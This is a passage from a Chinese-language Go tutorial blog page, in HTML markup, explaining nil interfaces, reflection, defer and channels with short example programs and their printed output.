main.Dog</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>nil interface</strong></p><p>官方定义：Interface values with nil underlying values:</p><ul><li>只声明没赋值的interface 是nil interface，value和 type 都是 nil</li><li>只要赋值了，即使赋了一个值为nil类型，也不再是nil interface</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> I <span class="hljs-keyword">interface</span> &#123;<br>Hello()<br>&#125;<br><br><span class="hljs-keyword">type</span> S []<span class="hljs-keyword">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(i S)</span> <span class="hljs-title">Hello</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> i I<br>fmt.Printf(<span class="hljs-string">&quot;1:i Type:%T\\n&quot;</span>, i)<br>fmt.Printf(<span class="hljs-string">&quot;2:i Value:%v\\n&quot;</span>, i)<br><br><span class="hljs-keyword">var</span> s S<br><span class="hljs-keyword">if</span> s == <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;3:s Value%v\\n&quot;</span>, s)<br>fmt.Printf(<span class="hljs-string">&quot;4:s Type is %T\\n&quot;</span>, s)<br>&#125;<br><br>i = s<br><span class="hljs-keyword">if</span> i == <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;5:i is nil&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;6:i Type:%T\\n&quot;</span>, i)<br>fmt.Printf(<span class="hljs-string">&quot;7:i Value:%v\\n&quot;</span>, i)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>output：</p><p>其中把值为 nil 的变量 s 赋值i后,i 不再为nil interface</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span>:i Type:&lt;<span class="hljs-literal">nil</span>&gt;<br><span class="hljs-number">2</span>:i Value:&lt;<span class="hljs-literal">nil</span>&gt;<br><span class="hljs-number">3</span>:s Value[]<br><span class="hljs-number">4</span>:s Type is main.S<br><span class="hljs-number">6</span>:i Type:main.S<br><span class="hljs-number">7</span>:i Value:[]<br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> State <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil1</span><span class="hljs-params">(a, b <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil2</span><span class="hljs-params">(a *State, b <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil3</span><span class="hljs-params">(a <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil4</span><span class="hljs-params">(a *State)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil5</span><span class="hljs-params">(a <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br>v := reflect.ValueOf(a)<br><span class="hljs-keyword">return</span> !v.IsValid() || v.IsNil()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a *State<br>fmt.Println(testnil1(a, <span class="hljs-literal">nil</span>)) <span class="hljs-comment">//false</span><br>fmt.Println(testnil2(a, <span class="hljs-literal">nil</span>)) <span class="hljs-comment">//false</span><br>fmt.Println(testnil3(a)) <span class="hljs-comment">//false</span><br>fmt.Println(testnil4(a)) <span class="hljs-comment">//true</span><br>fmt.Println(testnil5(a)) <span class="hljs-comment">//true</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>反射主要与Golang的interface类型相关（它的type是concrete type），只有interface类型才有反射一说。</p><p>在Golang的实现中，每个interface变量都有一个对应pair，pair中记录了实际变量的值和类型:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">(value, <span class="hljs-keyword">type</span>)<br></code></pre></td></tr></table></figure><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>reflect.TypeOf： 直接给到了我们想要的type类型，如float64、int、各种pointer、struct 等等真实的类型</p><p>reflect.ValueOf：直接给到了我们想要的具体的值，如1.2345这个具体数值，或者类似&amp;{1 “Allen.Wu” 25} 这样的结构体struct的值</p><p>也就是说明反射可以将“接口类型变量”转换为“反射类型对象”，反射类型指的是reflect.Type和reflect.Value这两种</p><h3 id="获取接口interface信息"><a href="#获取接口interface信息" class="headerlink" title="获取接口interface信息"></a>获取接口interface信息</h3><p>当执行reflect.ValueOf(interface)之后，就得到了一个类型为”relfect.Value”变量，可以通过它本身的Interface()方法获得接口变量的真实内容，然后可以通过类型判断进行转换，转换为原有真实类型。</p><h4 id="已知原有类型"><a href="#已知原有类型" class="headerlink" title="已知原有类型"></a>已知原有类型</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> num <span class="hljs-keyword">float64</span> = <span class="hljs-number">1.2345</span><br><br>pointer := reflect.ValueOf(&amp;num)<br>value := reflect.ValueOf(num)<br><br><span class="hljs-comment">// 可以理解为“强制转换”，但是需要注意的时候，转换的时候，如果转换的类型不完全符合，则直接panic</span><br><span class="hljs-comment">// Golang 对类型要求非常严格，类型一定要完全符合</span><br><span class="hljs-comment">// 如下两个，一个是*float64，一个是float64，如果弄混，则会panic</span><br>convertPointer := pointer.Interface().(*<span class="hljs-keyword">float64</span>)<br>convertValue := value.Interface().(<span class="hljs-keyword">float64</span>)<br><br>fmt.Println(convertPointer)<br>fmt.Println(convertValue)<br>&#125;<br><br><span class="hljs-comment">//运行结果：</span><br><span class="hljs-comment">//0xc42000e238</span><br><span class="hljs-comment">//1.2345</span><br><br></code></pre></td></tr></table></figure><h4 id="未知原有类型"><a href="#未知原有类型" class="headerlink" title="未知原有类型"></a>未知原有类型</h4><p>进行遍历探测其Filed</p><p>通过运行结果可以得知获取未知类型的interface的具体变量及其类型的步骤为：</p><ol><li>先获取interface的reflect.Type，然后通过NumField进行遍历</li><li>再通过reflect.Type的Field获取其Field</li><li>最后通过Field的Interface()得到对应的value</li></ol><p>通过运行结果可以得知获取未知类型的interface的所属方法（函数）的步骤为：</p><ol><li>先获取interface的reflect.Type，然后通过NumMethod进行遍历</li><li>再分别通过reflect.Type的Method获取对应的真实的方法（函数）</li><li>最后对结果取其Name和Type得知具体的方法名</li><li>也就是说反射可以将“反射类型对象”再重新转换为“接口类型变量”</li><li>struct 或者 struct 的嵌套都是一样的判断处理方式</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id   <span class="hljs-keyword">int</span><br>Name <span class="hljs-keyword">string</span><br>Age  <span class="hljs-keyword">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span> <span class="hljs-title">ReflectCallFunc</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Allen.Wu ReflectCallFunc&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>user := User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Allen.Wu&quot;</span>, <span class="hljs-number">25</span>&#125;<br><br>DoFiledAndMethod(user)<br><br>&#125;<br><br><span class="hljs-comment">// 通过接口来获取任意参数，然后一一揭晓</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DoFiledAndMethod</span><span class="hljs-params">(input <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br><br>getType := reflect.TypeOf(input)<br>fmt.Println(<span class="hljs-string">&quot;get Type is :&quot;</span>, getType.Name())<br><br>getValue := reflect.ValueOf(input)<br>fmt.Println(<span class="hljs-string">&quot;get all Fields is:&quot;</span>, getValue)<br><br><span class="hljs-comment">// 获取方法字段</span><br><span class="hljs-comment">// 1. 先获取interface的reflect.Type，然后通过NumField进行遍历</span><br><span class="hljs-comment">// 2. 再通过reflect.Type的Field获取其Field</span><br><span class="hljs-comment">// 3. 最后通过Field的Interface()得到对应的value</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; getType.NumField(); i++ &#123;<br>field := getType.Field(i)<br>value := getValue.Field(i).Interface()<br>fmt.Printf(<span class="hljs-string">&quot;%s: %v = %v\n&quot;</span>, field.Name, field.Type, value)<br>&#125;<br><br><span class="hljs-comment">// 获取方法</span><br><span class="hljs-comment">// 1. 先获取interface的reflect.Type，然后通过.NumMethod进行遍历</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; getType.NumMethod(); i++ &#123;<br>m := getType.Method(i)<br>fmt.Printf(<span class="hljs-string">&quot;%s: %v\n&quot;</span>, m.Name, m.Type)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//运行结果：</span><br><span class="hljs-comment">//get Type is : User</span><br><span class="hljs-comment">//get all Fields is: &#123;1 Allen.Wu 25&#125;</span><br><span class="hljs-comment">//Id: int = 1</span><br><span class="hljs-comment">//Name: string = Allen.Wu</span><br><span class="hljs-comment">//Age: int = 25</span><br><span class="hljs-comment">//ReflectCallFunc: func(main.User)</span><br><br></code></pre></td></tr></table></figure><h3 id="设置变量值"><a href="#设置变量值" class="headerlink" title="设置变量值"></a>设置变量值</h3><p>reflect.Value是通过reflect.ValueOf(X)获得的，只有当X是指针的时候，才可以通过reflec.Value修改实际变量X的值，即：要修改反射类型的对象就一定要保证其值是“addressable”的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">var</span> num <span class="hljs-keyword">float64</span> = <span class="hljs-number">1.2345</span><br>fmt.Println(<span class="hljs-string">&quot;old value of pointer:&quot;</span>, num)<br><br><span class="hljs-comment">// 通过reflect.ValueOf获取num中的reflect.Value，注意，参数必须是指针才能修改其值</span><br>pointer := reflect.ValueOf(&amp;num)<br>newValue := pointer.Elem()<br><br>fmt.Println(<span class="hljs-string">&quot;type of pointer:&quot;</span>, newValue.Type())<br>fmt.Println(<span class="hljs-string">&quot;settability of pointer:&quot;</span>, newValue.CanSet())<br><br><span class="hljs-comment">// 重新赋值</span><br>newValue.SetFloat(<span class="hljs-number">77</span>)<br>fmt.Println(<span class="hljs-string">&quot;new value of pointer:&quot;</span>, num)<br><br><span class="hljs-comment">////////////////////</span><br><span class="hljs-comment">// 如果reflect.ValueOf的参数不是指针，会如何？</span><br>pointer = reflect.ValueOf(num)<br><span class="hljs-comment">//newValue = pointer.Elem() // 如果非指针，这里直接panic，“panic: reflect: call of reflect.Value.Elem on float64 Value”</span><br>&#125;<br><br><span class="hljs-comment">//运行结果：</span><br><span class="hljs-comment">//old value of pointer: 1.2345</span><br><span class="hljs-comment">//type of pointer: float64</span><br><span class="hljs-comment">//settability of pointer: true</span><br><span class="hljs-comment">//new value of pointer: 77</span><br></code></pre></td></tr></table></figure><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id   <span class="hljs-keyword">int</span><br>Name <span class="hljs-keyword">string</span><br>Age  <span class="hljs-keyword">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span> <span class="hljs-title">ReflectCallFuncHasArgs</span><span class="hljs-params">(name <span class="hljs-keyword">string</span>, age <span class="hljs-keyword">int</span>)</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ReflectCallFuncHasArgs name: &quot;</span>, name, <span class="hljs-string">&quot;, age:&quot;</span>, age, <span class="hljs-string">&quot;and origal User.Name:&quot;</span>, u.Name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span> <span class="hljs-title">ReflectCallFuncNoArgs</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ReflectCallFuncNoArgs&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// 如何通过反射来进行方法的调用？</span><br><span class="hljs-comment">// 本来可以用u.ReflectCallFuncXXX直接调用的，但是如果要通过反射，那么首先要将方法注册，也就是MethodByName，然后通过反射调动mv.Call</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>user := User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Allen.Wu&quot;</span>, <span class="hljs-number">25</span>&#125;<br><br><span class="hljs-comment">// 1. 要通过反射来调用起对应的方法，必须要先通过reflect.ValueOf(interface)来获取到reflect.Value，得到“反射类型对象”后才能做下一步处理</span><br>getValue := reflect.ValueOf(user)<br><br><span class="hljs-comment">// 一定要指定参数为正确的方法名</span><br><span class="hljs-comment">// 2. 先看看带有参数的调用方法</span><br>methodValue := getValue.MethodByName(<span class="hljs-string">&quot;ReflectCallFuncHasArgs&quot;</span>)<br>args := []reflect.Value&#123;reflect.ValueOf(<span class="hljs-string">&quot;wudebao&quot;</span>), reflect.ValueOf(<span class="hljs-number">30</span>)&#125;<br>methodValue.Call(args)<br><br><span class="hljs-comment">// 一定要指定参数为正确的方法名</span><br><span class="hljs-comment">// 3. 再看看无参数的调用方法</span><br>methodValue = getValue.MethodByName(<span class="hljs-string">&quot;ReflectCallFuncNoArgs&quot;</span>)<br>args = <span class="hljs-built_in">make</span>([]reflect.Value, <span class="hljs-number">0</span>)<br>methodValue.Call(args)<br>&#125;<br><br><br><span class="hljs-comment">//运行结果：</span><br><span class="hljs-comment">//ReflectCallFuncHasArgs name:  wudebao , age: 30 and origal User.Name: Allen.Wu</span><br><span class="hljs-comment">//ReflectCallFuncNoArgs</span><br><br></code></pre></td></tr></table></figure><h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><p>向 <code>defer</code>关键字传入的函数会在函数返回之前运行。</p><p>存入的内容以先进后出的方式输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>&#123;<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;defer1 runs&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;block ends&quot;</span>)<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;defer2 runs&quot;</span>)<br>&#125;<br><br>fmt.Println(<span class="hljs-string">&quot;main ends&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">block ends<br>main ends<br>defer2 runs<br>defer1 runs<br></code></pre></td></tr></table></figure><p>调用 <code>defer</code>关键字会立刻拷贝函数中引用的外部参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>startedAt := time.Now()<br><span class="hljs-keyword">defer</span> fmt.Println(time.Since(startedAt)) <span class="hljs-comment">//0s</span><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; fmt.Println(time.Since(startedAt)) &#125;() <span class="hljs-comment">//1s</span><br><br>time.Sleep(time.Second)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Goroutines和Channels"><a href="#Goroutines和Channels" class="headerlink" title="Goroutines和Channels"></a>Goroutines和Channels</h2><h3 id="并发和协程"><a href="#并发和协程" class="headerlink" title="并发和协程"></a>并发和协程</h3><p><a href="https://blog.csdn.net/qq_34556414/article/details/120150360">并发协程相关知识</a></p><h3 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h3><p><strong>不要让计算通过共享内存来通讯，而应该让它们通过通讯来共享内存。</strong>通道机制就是这种哲学的一个设计结果</p><p>我们可以把一个通道看作是在一个程序内部的一个先进先出（FIFO：first in first out）数据队列。 一些协程可以向此通道发送数据，另外一些协程可以从此通道接收数据。</p><p>通道可以是双向的，也可以是单向的。</p><ul><li>字面形式<code>chan T</code>表示一个元素类型为<code>T</code>的双向通道类型。 编译器允许从此类型的值中接收和向此类型的值中发送数据。</li><li>字面形式<code>chan&lt;- T</code>表示一个元素类型为<code>T</code>的单向发送通道类型。 编译器不允许从此类型的值中接收数据。</li><li>字面形式<code>&lt;-chan T</code>表示一个元素类型为<code>T</code>的单向接收通道类型。 编译器不允许向此类型的值中发送数据。</li></ul><p>一个容量为0的通道值称为一个非缓冲通道（unbuffered channel），一个容量不为0的通道值称为一个缓冲通道（buffered channel）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)    <span class="hljs-comment">// unbuffered channel</span><br>ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">0</span>) <span class="hljs-comment">// unbuffered channel</span><br>ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">3</span>) <span class="hljs-comment">// buffered channel with capacity 3</span><br></code></pre></td></tr></table></figure><p>当一个通道值被赋给另一个通道值后，这两个通道值将共享相同的底层部分。 换句话说，这两个通道引用着同一个底层的内部通道对象。 比较这两个通道的结果为<code>true</code>。</p><p>通道的操作</p><ol><li><p>调用内置函数<code>close</code>来关闭一个通道：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">(ch)</span></span><br></code></pre></td></tr></table></figure><p>传给<code>close</code>函数调用的实参必须为一个通道值，并且此通道值不能为单向接收的。</p></li><li><p>使用下面的语法向通道<code>ch</code>发送一个值<code>v</code>：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">ch &lt;- v<br></code></pre></td></tr></table></figure><p><code>v</code>必须能够赋值给通道<code>ch</code>的元素类型。 <code>ch</code>不能为单向接收通道。 <code>&lt;-</code>称为数据发送操作符。</p></li><li><p>使用下面的语法从通道<code>ch</code>接收一个值：如果一个通道操作不永久阻塞，它总会返回至少一个值，此值的类型为通道<code>ch</code>的元素类型。 <code>ch</code>不能为单向发送通道。 <code>&lt;-</code>称为数据接收操作符，是的它和数据发送操作符的表示形式是一样的。在大多数场合下，一个数据接收操作可以被认为是一个单值表达式。 但是，当一个数据接收操作被用做一个赋值语句中的唯一的源值的时候，它可以返回第二个可选的类型不确定的布尔值返回值从而成为一个多值表达式。 此类型不确定的布尔值表示第一个接收到的值是否是在通道被关闭前发送的。 （从后面的章节，我们将得知我们可以从一个已关闭的通道中接收到无穷个值。）数据接收操作在赋值中被用做源值的例子：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;-ch<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">v = &lt;-ch<br>v, sentBeforeClosed = &lt;-ch<br></code></pre></td></tr></table></figure></li><li><p>查询一个通道的容量：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cap</span><span class="hljs-params">(ch)</span></span><br></code></pre></td></tr></table></figure><p> <code>cap</code>的返回值的类型为内置类型<code>int</code>。</p></li><li><p>查询一个通道的长度：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">len</span><span class="hljs-params">(ch)</span></span><br></code></pre></td></tr></table></figure></li></ol><p> <code>len</code>的返回值的类型也为内置类型<code>int</code>。 一个通道的长度是指当前有多少个已被发送到此通道但还未被接收出去的元素值。</p><ul><li>如果一个通道已经关闭了，则它的发送数据协程队列和接收数据协程队列肯定都为空，但是它的缓冲队列可能不为空。</li><li>在任何时刻，如果缓冲队列不为空，则接收数据协程队列必为空。</li><li>在任何时刻，如果缓冲队列未满，则发送数据协程队列必为空。</li><li>如果一个通道是缓冲的，则在任何时刻，它的发送数据协程队列和接收数据协程队列之一必为空。</li><li>如果一个通道是非缓冲的，则在任何时刻，一般说来，它的发送数据协程队列和接收数据协程队列之一必为空， 但是有一个例外：一个协程可能在一个<code>select</code>流程控制中同时被推入到此通道的发送数据协程队列和接收数据协程队列中。</li></ul><p>一个简单的通过一个非缓冲通道实现的请求/响应的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 